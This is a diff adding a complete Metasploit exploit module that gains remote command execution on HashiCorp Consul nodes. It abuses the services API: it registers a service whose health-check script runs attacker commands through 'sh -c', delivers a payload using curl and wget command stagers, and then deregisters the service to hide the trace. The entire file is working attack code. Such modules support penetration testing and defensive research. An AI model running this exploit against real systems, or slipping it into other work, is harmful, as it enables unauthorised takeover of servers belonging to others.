@@ -1,0 +1,132 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Hashicorp Consul Remote Command Execution via Services API",
+      'Description'    => %q{
+        This module exploits Hashicorp Consul's services API to gain remote command
+        execution on Consul nodes.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Bharadwaj Machiraju <bharadwaj.machiraju[at]gmail.com>', # Discovery and PoC
+          'Francis Alexander <helofrancis[at]gmail.com >', # Discovery and PoC
+          'Quentin Kaiser <kaiserquentin[at]gmail.com>' # Metasploit module
+        ],
+      'References'     =>
+        [
+          [ 'URL', 'https://www.consul.io/api/agent/service.html' ],
+          [ 'URL', 'https://github.com/torque59/Garfield' ]
+        ],
+      'Platform'        => 'linux',
+      'Targets'         => [ [ 'Linux', {} ] ],
+      'Payload'         => {},
+      'CmdStagerFlavor' => [ 'bourne', 'echo', 'printf', 'curl', 'wget'],
+      'Privileged'     => false,
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Aug 11 2018'))
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path', '/']),
+        OptBool.new('SSL', [false, 'Negotiate SSL/TLS for outgoing connections', false]),
+        OptString.new('ACL_TOKEN', [false, 'Consul Agent ACL token', '']),
+        Opt::RPORT(8500)
+      ])
+  end
+
+  def check
+    res = send_request_cgi({
+      'method'  => 'GET',
+      'uri'     => normalize_uri(target_uri.path, '/v1/agent/self'),
+      'headers' => {
+        'X-Consul-Token' => datastore['ACL_TOKEN']
+      }
+    })
+
+    unless res
+      vprint_error 'Connection failed'
+      return CheckCode::Unknown
+    end
+
+    unless res.code == 200
+      vprint_error 'Unexpected reply'
+      return CheckCode::Safe
+    end
+
+    agent_info = JSON.parse(res.body)
+
+    if agent_info["Config"]["EnableScriptChecks"] == true || agent_info["DebugConfig"]["EnableScriptChecks"] == true || agent_info["DebugConfig"]["EnableRemoteScriptChecks"] == true
+      return CheckCode::Vulnerable
+    end
+
+    CheckCode::Safe
+  rescue JSON::ParserError
+    vprint_error 'Failed to parse JSON output.'
+    return CheckCode::Unknown
+  end
+
+  def execute_command(cmd, opts = {})
+    uri = target_uri.path
+    service_name = Rex::Text.rand_text_alpha(5..10)
+    print_status("Creating service '#{service_name}'")
+
+    # NOTE: Timeout defines how much time the check script will run until
+    # getting killed. Arbitrarily set to one day for now.
+    res = send_request_cgi({
+      'method' => 'PUT',
+      'uri' => normalize_uri(uri, 'v1/agent/service/register'),
+      'headers' => {
+        'X-Consul-Token' => datastore['ACL_TOKEN']
+      },
+      'ctype' => 'application/json',
+      'data' => {
+        :ID => "#{service_name}",
+        :Name => "#{service_name}",
+        :Address => "127.0.0.1",
+        :Port => 80,
+        :check => {
+          :script => "#{cmd}",
+          :Args => ["sh", "-c", "#{cmd}"],
+          :interval => "10s",
+          :Timeout => "86400s"
+        }
+      }.to_json
+    })
+    unless res && res.code == 200
+      fail_with(Failure::UnexpectedReply, 'An error occured when contacting the Consul API.')
+    end
+    print_status("Service '#{service_name}' successfully created.")
+    print_status("Waiting for service '#{service_name}' script to trigger")
+    sleep(12)
+    print_status("Removing service '#{service_name}'")
+    res = send_request_cgi({
+      'method' => 'PUT',
+      'uri' => normalize_uri(
+        uri,
+        "v1/agent/service/deregister/#{service_name}"
+      ),
+      'headers' => {
+        'X-Consul-Token' => datastore['ACL_TOKEN']
+      }
+    })
+    if res && res.code != 200
+      fail_with(Failure::UnexpectedReply,
+        'An error occured when contacting the Consul API.'
+      )
+    end
+  end
+
+  def exploit
+    execute_cmdstager()
+  end
+end
